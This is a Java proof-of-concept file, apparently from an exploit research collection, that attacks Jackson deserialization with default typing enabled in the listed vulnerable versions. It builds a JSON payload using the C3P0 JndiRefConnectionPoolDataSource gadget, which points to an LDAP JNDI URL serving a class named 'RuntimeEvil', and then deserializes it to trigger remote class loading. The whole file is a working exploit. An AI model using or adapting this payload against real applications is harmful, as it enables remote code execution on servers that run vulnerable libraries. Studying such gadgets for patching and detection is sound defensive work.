package org.exploit.third.c3p0;

import com.fasterxml.jackson.databind.ObjectMapper;

//Jackson 2.7系列 < 2.7.9.2
//Jackson 2.8系列 < 2.8.11
//Jackson 2.9系列 < 2.9.4
//C3P0 <= 0.9.5.2
public class jackson_JNDI {
    public static class enableDefaultTyping_Test {
        public Object object;
    }
    public static void main(String[] args) throws Exception {
        String jndiName = "'ldap://127.0.0.1:1099/JDNI_RuntimeEvil'";
        String jsonInput = aposToQuotes("{\"object\":['com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource',\n" +
                "{\n" +
                "'jndiName':"+jndiName+",\n" +
                "'loginTimeout':'2',\n" +
                "}\n" +
                "]\n" +
                "}");
        System.out.printf(jsonInput);
        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping();
        jackson_JNDI.enableDefaultTyping_Test test;
        try {
            test = mapper.readValue(jsonInput, jackson_JNDI.enableDefaultTyping_Test.class);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static String aposToQuotes(String json){
        return json.replace("'","\"");
    }
}
